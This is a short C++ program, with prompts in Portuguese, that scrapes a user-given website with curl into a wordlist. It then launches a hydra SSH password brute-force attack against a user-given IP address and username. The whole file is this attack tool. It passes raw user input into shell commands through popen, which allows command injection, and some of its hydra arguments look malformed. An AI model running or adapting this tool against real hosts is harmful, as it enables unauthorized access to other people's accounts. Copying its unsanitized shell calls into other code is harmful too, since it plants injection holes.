#include <cstdio>
#include <iostream>

using namespace std;
 
int main() {
    string website, ip, usuario;
    
    cout << "Insira o website:" << endl;
    cin >> website;
    cout << "Insira o endereço ip que precisa ser testado:" << endl;
    cin >> ip;
	
    char pipeline[256];
    snprintf(
		    pipeline, 
		    sizeof(pipeline), 
		    "curl %s | sed 's/[^a-zA-Z ]/ /g' | tr 'A-Z ' 'a-z\n' | grep '[a-z]' | sort -u > /tmp/wordlist.txt", 
		    website.c_str()
		    );

    FILE *pipe1 = popen(pipeline, "r");
    pclose(pipe1);

    cout << pipeline << endl;
    cout << pipe1 << endl;

    cout << "Agora insira o nome do usuário" << endl;
    cin >> usuario;

    char hydra[256];
    const char* command = "hydra -l %s -P /tmp/wordlist.txt -V -f 4 %s ssh";
    snprintf(
		    hydra, 
		    sizeof(hydra),
		    command, 
		    usuario.c_str(), 
		    ip.c_str()
		    );

    FILE *pipe2 = popen(hydra, "r");
	
    cout << hydra << endl;
    cout << pipe2 << endl;

    char buffer[256];
    if (pipe2) {  
        while (!feof(pipe2)) { 
            if (fgets(buffer, sizeof(buffer), pipe2) != nullptr) { 
                // Process output line by line (here, printing) 
                printf("%s", buffer); 
            } 
        } 
        pclose(pipe2);
    } 
    return 0;
}
